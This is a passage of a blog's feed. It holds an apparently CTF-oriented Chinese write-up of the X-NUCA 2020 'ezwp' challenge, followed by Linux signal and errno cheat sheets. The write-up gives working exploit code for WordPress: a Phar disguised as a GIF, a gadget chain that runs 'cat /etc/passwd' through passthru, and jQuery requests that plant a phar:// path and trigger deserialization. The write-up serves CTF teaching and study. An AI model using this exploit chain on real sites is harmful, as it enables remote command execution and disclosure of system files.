$attachment_id, $file </span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( ! get_post( $attachment_id ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filters the path to the attached file to update.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $file          Path to the attached file to update.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$file = apply_filters( <span class="string">&#x27;update_attached_file&#x27;</span>, $file, $attachment_id );</span><br><span class="line"></span><br><span class="line">$file = _wp_relative_upload_path( $file );</span><br><span class="line"><span class="keyword">if</span> ( $file ) &#123;</span><br><span class="line"><span class="keyword">return</span> update_post_meta( $attachment_id, <span class="string">&#x27;_wp_attached_file&#x27;</span>, $file );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> delete_post_meta( $attachment_id, <span class="string">&#x27;_wp_attached_file&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过update_post_meta更新_wp_attached_file字段，最终导致file可控。</p><h1 id="0x4-wp-attachment-metadata"><a href="#0x4-wp-attachment-metadata" class="headerlink" title="0x4 wp_attachment_metadata"></a>0x4 wp_attachment_metadata</h1><p>接下来修改_wp_attachmen\t_metadata字段，同样在在/wp-admin/post.php中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">switch</span> ( $action ) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;editattachment&#x27;</span>:</span><br><span class="line">check_admin_referer( <span class="string">&#x27;update-post_&#x27;</span> . $post_id );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Don&#x27;t let these be changed.</span></span><br><span class="line"><span class="keyword">unset</span>( $_POST[<span class="string">&#x27;guid&#x27;</span>] );</span><br><span class="line">$_POST[<span class="string">&#x27;post_type&#x27;</span>] = <span class="string">&#x27;attachment&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the thumbnail filename.</span></span><br><span class="line">$newmeta          = wp_get_attachment_metadata( $post_id, <span class="literal">true</span> );</span><br><span class="line">$newmeta[<span class="string">&#x27;thumb&#x27;</span>] = $_POST[<span class="string">&#x27;thumb&#x27;</span>];</span><br><span class="line"></span><br><span class="line">wp_update_attachment_metadata( $post_id, $newmeta );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Intentional fall-through to trigger the edit_post() call.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个wp_update_attachment_metadata，参数newmeta[‘thumb’]刚好就是我们需要的imagedata[‘thumb’]。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Updates metadata for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data          Attachment meta data.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|bool False if $post is invalid.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_attachment_metadata</span>(<span class="params"> $attachment_id, $data </span>) </span>&#123;</span><br><span class="line">$attachment_id = (<span class="keyword">int</span>) $attachment_id;</span><br><span class="line"></span><br><span class="line">$post = get_post( $attachment_id );</span><br><span class="line"><span class="keyword">if</span> ( ! $post ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filters the updated attachment meta data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data          Array of updated attachment meta data.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$data = apply_filters( <span class="string">&#x27;wp_update_attachment_metadata&#x27;</span>, $data, $post-&gt;ID );</span><br><span class="line"><span class="keyword">if</span> ( $data ) &#123;</span><br><span class="line"><span class="keyword">return</span> update_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, $data );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> delete_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过update_post_meta更新_wp_attachment_metadata字段，导致imagedata可控。</p><h1 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h1><p>首先需要生成一个Phar文件，但是WordPress并不傻，Phar这种很容易被反序列化的文件WordPress肯定是不让直接上传的，因此这里就需要先将Phar文件伪装成gif文件之后才可以直接上传，但是序列化后的字符串还存在与该gif文件中，在phar伪协议读取该gif文件的时候仍旧可以触发反序列化。另外WordPress会拦截上传文件中的php代码，如果直接将<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>写入gif文件中会被WordPress拦截，因此可以使用短标签即可绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $callback;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_preserve;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_preserve = <span class="keyword">new</span> Requests_Utility_FilteredIterator(<span class="keyword">array</span>(<span class="string">&#x27;cat /etc/passwd&#x27;</span>), <span class="string">&#x27;passthru&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;a.gif&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;? __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">// Short tag.</span></span><br><span class="line">$phar-&gt;setMetadata(<span class="keyword">new</span> Ai1ec_Shutdown_Controller());</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;a.phar&#x27;</span>, <span class="string">&#x27;a.gif&#x27;</span>);</span><br></pre></td></tr></table></figure><p>生成好gif以后上传该文件，上传成功以后就可以拿到该文件的id。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/3.png"></p><p>WordPress为了防御CSRF，在每一个页面都加入了一个nonce以及对referer的验证，所以我们还需要拿到nonce才能发送post请求。注意每个页面的nonce都不同，这里需要edit页面的nonce，如下所示。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/4.png"></p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/5.png"></p><p>为了避免登陆cookie的麻烦，直接使用ajax发送请求，当然使用python也可以，将下面的exp配置修改完成后粘贴到浏览器控制台执行即可，如果下面的exp返回了错误的结果（例如403），那么可能是由于nonce或者id错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nonce = <span class="string">&quot;37e43b20f4&quot;</span></span><br><span class="line"><span class="keyword">var</span> id = <span class="string">&quot;9&quot;</span></span><br><span class="line"><span class="keyword">var</span> thumb = <span class="string">&quot;phar://../wp-content/uploads/2020/12/a.gif/test.txt&quot;</span></span><br><span class="line"><span class="keyword">var</span> ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment">// var ip = &quot;172.16.9.51&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _wp_attached_file</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>:<span class="string">&quot;attachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;Z:\\Z&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// _wp_attachment_metadata</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editattachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;thumb&quot;</span>:thumb</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的exp执行完成后_wp_attachment_metadata与_wp_attached_file字段就修改完成了。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/7.png"></p><p>最后访问页面<code>/wp-admin/media.php?attachment_id=9&amp;action=edit</code>就可以触发反序列化执行命令获取输出。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/6.png"></p><h1 id="0x6-Contact-Form-7"><a href="#0x6-Contact-Form-7" class="headerlink" title="0x6 Contact-Form-7"></a>0x6 Contact-Form-7</h1>]]></content>
    
    
    <summary type="html">X-nuca 2020 Web challenge ezwp writeup.</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Signal CheatSheet</title>
    <link href="https://srpopty.github.io/2020/10/26/Signal-CheatSheet/"/>
    <id>https://srpopty.github.io/2020/10/26/Signal-CheatSheet/</id>
    <published>2020-10-26T08:52:22.000Z</published>
    <updated>2021-07-31T12:53:44.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-Linux-signals"><a href="#0x0-Linux-signals" class="headerlink" title="0x0 Linux signals"></a>0x0 Linux signals</h1><table><thead><tr><th align="center">number</th><th align="center">hex</th><th>symbol</th><th>description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0x01</td><td>SIGHUP</td><td>Hangup</td></tr><tr><td align="center">2</td><td align="center">0x02</td><td>SIGINT</td><td>Interrupt</td></tr><tr><td align="center">3</td><td align="center">0x03</td><td>SIGQUIT</td><td>Quit</td></tr><tr><td align="center">4</td><td align="center">0x04</td><td>SIGILL</td><td>Illegal instruction</td></tr><tr><td align="center">5</td><td align="center">0x05</td><td>SIGTRAP</td><td>Trace/breakpoint trap</td></tr><tr><td align="center">6</td><td align="center">0x06</td><td>SIGABRT</td><td>Aborted</td></tr><tr><td align="center">6</td><td align="center">0x06</td><td>SIGIOT</td><td><em>(Same value as SIGABRT)</em> Aborted</td></tr><tr><td align="center">7</td><td align="center">0x07</td><td>SIGBUS</td><td>Bus error</td></tr><tr><td align="center">8</td><td align="center">0x08</td><td>SIGFPE</td><td>Floating point exception</td></tr><tr><td align="center">9</td><td align="center">0x09</td><td>SIGKILL</td><td>Killed</td></tr><tr><td align="center">10</td><td align="center">0x0a</td><td>SIGUSR1</td><td>User defined signal 1</td></tr><tr><td align="center">11</td><td align="center">0x0b</td><td>SIGSEGV</td><td>Segmentation fault</td></tr><tr><td align="center">12</td><td align="center">0x0c</td><td>SIGUSR2</td><td>User defined signal 2</td></tr><tr><td align="center">13</td><td align="center">0x0d</td><td>SIGPIPE</td><td>Broken pipe</td></tr><tr><td align="center">14</td><td align="center">0x0e</td><td>SIGALRM</td><td>Alarm clock</td></tr><tr><td align="center">15</td><td align="center">0x0f</td><td>SIGTERM</td><td>Terminated</td></tr><tr><td align="center">16</td><td align="center">0x10</td><td>SIGSTKFLT</td><td>Stack fault</td></tr><tr><td align="center">17</td><td align="center">0x11</td><td>SIGCHLD</td><td>Child exited</td></tr><tr><td align="center">17</td><td align="center">0x11</td><td>SIGCLD</td><td><em>(Same value as SIGCHLD)</em> Child exited</td></tr><tr><td align="center">18</td><td align="center">0x12</td><td>SIGCONT</td><td>Continued</td></tr><tr><td align="center">19</td><td align="center">0x13</td><td>SIGSTOP</td><td>Stopped (signal)</td></tr><tr><td align="center">20</td><td align="center">0x14</td><td>SIGTSTP</td><td>Stopped</td></tr><tr><td align="center">21</td><td align="center">0x15</td><td>SIGTTIN</td><td>Stopped (tty input)</td></tr><tr><td align="center">22</td><td align="center">0x16</td><td>SIGTTOU</td><td>Stopped (tty output)</td></tr><tr><td align="center">23</td><td align="center">0x17</td><td>SIGURG</td><td>Urgent I/O condition</td></tr><tr><td align="center">24</td><td align="center">0x18</td><td>SIGXCPU</td><td>CPU time limit exceeded</td></tr><tr><td align="center">25</td><td align="center">0x19</td><td>SIGXFSZ</td><td>File size limit exceeded</td></tr><tr><td align="center">26</td><td align="center">0x1a</td><td>SIGVTALRM</td><td>Virtual timer expired</td></tr><tr><td align="center">27</td><td align="center">0x1b</td><td>SIGPROF</td><td>Profiling timer expired</td></tr><tr><td align="center">28</td><td align="center">0x1c</td><td>SIGWINCH</td><td>Window changed</td></tr><tr><td align="center">29</td><td align="center">0x1d</td><td>SIGPOLL</td><td>I/O possible</td></tr><tr><td align="center">29</td><td align="center">0x1d</td><td>SIGIO</td><td><em>(Same value as SIGPOLL)</em> I/O possible</td></tr><tr><td align="center">30</td><td align="center">0x1e</td><td>SIGPWR</td><td>Power failure</td></tr><tr><td align="center">31</td><td align="center">0x1f</td><td>SIGSYS</td><td>Bad system call</td></tr><tr><td align="center">32</td><td align="center">0x20</td><td>SIGRTMIN-2</td><td>Real-time signal reserved by the C library for NPTL; see [signal(7)]</td></tr><tr><td align="center">33</td><td align="center">0x21</td><td>SIGRTMIN-1</td><td>Real-time signal reserved by the C library for NPTL; see [signal(7)]</td></tr><tr><td align="center">34</td><td align="center">0x22</td><td>SIGRTMIN</td><td>Real-time signal 0</td></tr><tr><td align="center">35</td><td align="center">0x23</td><td>SIGRTMIN+1</td><td>Real-time signal 1</td></tr><tr><td align="center">36</td><td align="center">0x24</td><td>SIGRTMIN+2</td><td>Real-time signal 2</td></tr><tr><td align="center">37</td><td align="center">0x25</td><td>SIGRTMIN+3</td><td>Real-time signal 3</td></tr><tr><td align="center">38</td><td align="center">0x26</td><td>SIGRTMIN+4</td><td>Real-time signal 4</td></tr><tr><td align="center">39</td><td align="center">0x27</td><td>SIGRTMIN+5</td><td>Real-time signal 5</td></tr><tr><td align="center">40</td><td align="center">0x28</td><td>SIGRTMIN+6</td><td>Real-time signal 6</td></tr><tr><td align="center">41</td><td align="center">0x29</td><td>SIGRTMIN+7</td><td>Real-time signal 7</td></tr><tr><td align="center">42</td><td align="center">0x2a</td><td>SIGRTMIN+8</td><td>Real-time signal 8</td></tr><tr><td align="center">43</td><td align="center">0x2b</td><td>SIGRTMIN+9</td><td>Real-time signal 9</td></tr><tr><td align="center">44</td><td align="center">0x2c</td><td>SIGRTMIN+10</td><td>Real-time signal 10</td></tr><tr><td align="center">45</td><td align="center">0x2d</td><td>SIGRTMIN+11</td><td>Real-time signal 11</td></tr><tr><td align="center">46</td><td align="center">0x2e</td><td>SIGRTMIN+12</td><td>Real-time signal 12</td></tr><tr><td align="center">47</td><td align="center">0x2f</td><td>SIGRTMIN+13</td><td>Real-time signal 13</td></tr><tr><td align="center">48</td><td align="center">0x30</td><td>SIGRTMIN+14</td><td>Real-time signal 14</td></tr><tr><td align="center">49</td><td align="center">0x31</td><td>SIGRTMIN+15</td><td>Real-time signal 15</td></tr><tr><td align="center">50</td><td align="center">0x32</td><td>SIGRTMAX-14</td><td>Real-time signal 16</td></tr><tr><td align="center">51</td><td align="center">0x33</td><td>SIGRTMAX-13</td><td>Real-time signal 17</td></tr><tr><td align="center">52</td><td align="center">0x34</td><td>SIGRTMAX-12</td><td>Real-time signal 18</td></tr><tr><td align="center">53</td><td align="center">0x35</td><td>SIGRTMAX-11</td><td>Real-time signal 19</td></tr><tr><td align="center">54</td><td align="center">0x36</td><td>SIGRTMAX-10</td><td>Real-time signal 20</td></tr><tr><td align="center">55</td><td align="center">0x37</td><td>SIGRTMAX-9</td><td>Real-time signal 21</td></tr><tr><td align="center">56</td><td align="center">0x38</td><td>SIGRTMAX-8</td><td>Real-time signal 22</td></tr><tr><td align="center">57</td><td align="center">0x39</td><td>SIGRTMAX-7</td><td>Real-time signal 23</td></tr><tr><td align="center">58</td><td align="center">0x3a</td><td>SIGRTMAX-6</td><td>Real-time signal 24</td></tr><tr><td align="center">59</td><td align="center">0x3b</td><td>SIGRTMAX-5</td><td>Real-time signal 25</td></tr><tr><td align="center">60</td><td align="center">0x3c</td><td>SIGRTMAX-4</td><td>Real-time signal 26</td></tr><tr><td align="center">61</td><td align="center">0x3d</td><td>SIGRTMAX-3</td><td>Real-time signal 27</td></tr><tr><td align="center">62</td><td align="center">0x3e</td><td>SIGRTMAX-2</td><td>Real-time signal 28</td></tr><tr><td align="center">63</td><td align="center">0x3f</td><td>SIGRTMAX-1</td><td>Real-time signal 29</td></tr><tr><td align="center">64</td><td align="center">0x40</td><td>SIGRTMAX</td><td>Real-time signal 30</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">Common signals.</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>Errorno CheatSheet</title>
    <link href="https://srpopty.github.io/2020/10/26/Errorno-CheatSheet/"/>
    <id>https://srpopty.github.io/2020/10/26/Errorno-CheatSheet/</id>
    <published>2020-10-26T08:44:16.000Z</published>
    <updated>2021-07-31T12:53:25.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-Linux-errorno"><a href="#0x0-Linux-errorno" class="headerlink" title="0x0 Linux errorno"></a>0x0 Linux errorno</h1><table><thead><tr><th align="center">number</th><th align="center">hex</th><th>symbol</th><th>description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0x01</td><td>EPERM</td><td>Operation not permitted</td></tr><tr><td align="center">2</td><td align="center">0x02</td><td>ENOENT</td><td>No such file or directory</td></tr><tr><td align="center">3</td><td align="center">0x03</td><td>ESRCH</td><td>No such process</td></tr><tr><td align="center">4</td><td align="center">0x04</td><td>EINTR</td><td>Interrupted system call</td></tr><tr><td align="center">5</td><td align="center">0x05</td><td>EIO</td><td>Input/output error</td></tr><tr><td align="center">6</td><td align="center">0x06</td><td>ENXIO</td><td>No such device or address</td></tr><tr><td align="center">7</td><td align="center">0x07</td><td>E2BIG</td><td>Argument list too long</td></tr><tr><td align="center">8</td><td align="center">0x08</td><td>ENOEXEC</td><td>Exec format error</td></tr><tr><td align="center">9</td><td align="center">0x09</td><td>EBADF</td><td>Bad file descriptor</td></tr><tr><td align="center">10</td><td align="center">0x0a</td><td>ECHILD</td><td>No child processes</td></tr><tr><td align="center">11</td><td align="center">0x0b</td><td>EAGAIN</td><td>Resource temporarily unavailable</td></tr><tr><td align="center">11</td><td align="center">0x0b</td><td>EWOULDBLOCK</td><td><em>(Same value as EAGAIN)</em> Resource temporarily unavailable</td></tr><tr><td align="center">12</td><td align="center">0x0c</td><td>ENOMEM</td><td>Cannot allocate memory</td></tr><tr><td align="center">13</td><td align="center">0x0d</td><td>EACCES</td><td>Permission denied</td></tr><tr><td align="center">14</td><td align="center">0x0e</td><td>EFAULT</td><td>Bad address</td></tr><tr><td align="center">15</td><td align="center">0x0f</td><td>ENOTBLK</td><td>Block device required</td></tr><tr><td align="center">16</td><td align="center">0x10</td><td>EBUSY</td><td>Device or resource busy</td></tr><tr><td align="center">17</td><td align="center">0x11</td><td>EEXIST</td><td>File exists</td></tr><tr><td align="center">18</td><td align="center">0x12</td><td>EXDEV</td><td>Invalid cross-device link</td></tr><tr><td align="center">19</td><td align="center">0x13</td><td>ENODEV</td><td>No such device</td></tr><tr><td align="center">20</td><td align="center">0x14</td><td>ENOTDIR</td><td>Not a directory</td></tr><tr><td align="center">21</td><td align="center">0x15</td><td>EISDIR</td><td>Is a directory</td></tr><tr><td align="center">22</td><td align="center">0x16</td><td>EINVAL</td><td>Invalid argument</td></tr><tr><td align="center">23</td><td align="center">0x17</td><td>ENFILE</td><td>Too many open files in system</td></tr><tr><td align="center">24</td><td align="center">0x18</td><td>EMFILE</td><td>Too many open files</td></tr><tr><td align="center">25</td><td align="center">0x19</td><td>ENOTTY</td><td>Inappropriate ioctl for device</td></tr><tr><td align="center">26</td><td align="center">0x1a</td><td>ETXTBSY</td><td>Text file busy</td></tr><tr><td align="center">27</td><td align="center">0x1b</td><td>EFBIG</td><td>File too large</td></tr><tr><td align="center">28</td><td align="center">0x1c</td><td>ENOSPC</td><td>No space left on device</td></tr><tr><td align="center">29</td><td align="center">0x1d</td><td>ESPIPE</td><td>Illegal seek</td></tr><tr><td align="center">30</td><td align="center">0x1e</td><td>EROFS</td><td>Read-only file system</td></tr><tr><td align="center">31</td><td align="center">0x1f</td><td>EMLINK</td><td>Too many links</td></tr><tr><td align="center">32</td><td align="center">0x20</td><td>EPIPE</td><td>Broken pipe</td></tr><tr><td align="center">33</td><td align="center">0x21</td><td>EDOM</td><td>Numerical argument out of domain</td></tr><tr><td align="center">34</td><td align="center">0x22</td><td>ERANGE</td><td>Numerical result out of range</td></tr><tr><td align="center">35</td><td align="center">0x23</td><td>EDEADLK</td><td>Resource deadlock avoided</td></tr><tr><td align="center">35</td><td align="center">0x23</td><td>EDEADLOCK</td><td><em>(Same value as EDEADLK)</em> Resource deadlock avoided</td></tr><tr><td align="center">36</td><td align="center">0x24</td><td>ENAMETOOLONG</td><td>File name too long</td></tr><tr><td align="center">37</td><td align="center">0x25</td><td>ENOLCK</td><td>No locks available</td></tr><tr><td align="center">38</td><td align="center">0x26</td><td>ENOSYS</td><td>Function not implemented</td></tr><tr><td align="center">39</td><td align="center">0x27</td><td>ENOTEMPTY</td><td>Directory not empty</td></tr><tr><td align="center">40</td><td align="center">0x28</td><td>ELOOP</td><td>Too many levels of symbolic links</td></tr><tr><td align="center">41</td><td align="center">0x29</td><td></td><td><em>not implemented</em></td></tr><tr><td align="center">42</td><td align="center">0x2a</td><td>ENOMSG</td><td>No message of desired type</td></tr><tr><td align="center">43</td><td align="center">0x2b</td><td>EIDRM</td><td>Identifier removed</td></tr><tr><td align="center">44</td><td align="center">0x2c</td><td>ECHRNG</td><td>Channel number out of range</td></tr><tr><td align="center">45</td><td align="center">0x2d</td><td>EL2NSYNC</td><td>Level 2 not synchronized</td></tr><tr><td align="center">46</td><td align="center">0x2e</td><td>EL3HLT</td><td>Level 3 halted</td></tr><tr><td align="center">47</td><td align="center">0x2f</td><td>EL3RST</td><td>Level 3 reset</td></tr><tr><td align="center">48</td><td align="center">0x30</td><td>ELNRNG</td><td>Link number out of range</td></tr><tr><td align="center">49</td><td align="center">0x31</td><td>EUNATCH</td><td>Protocol driver not attached</td></tr><tr><td align="center">50</td><td align="center">0x32</td><td>ENOCSI</td><td>No CSI structure available</td></tr><tr><td align="center">51</td><td align="center">0x33</td><td>EL2HLT</td><td>Level 2 halted</td></tr><tr><td align="center">52</td><td align="center">0x34</td><td>EBADE</td><td>Invalid exchange</td></tr><tr><td align="center">53</td><td align="center">0x35</td><td>EBADR</td><td>Invalid request descriptor</td></tr><tr><td align="center">54</td><td 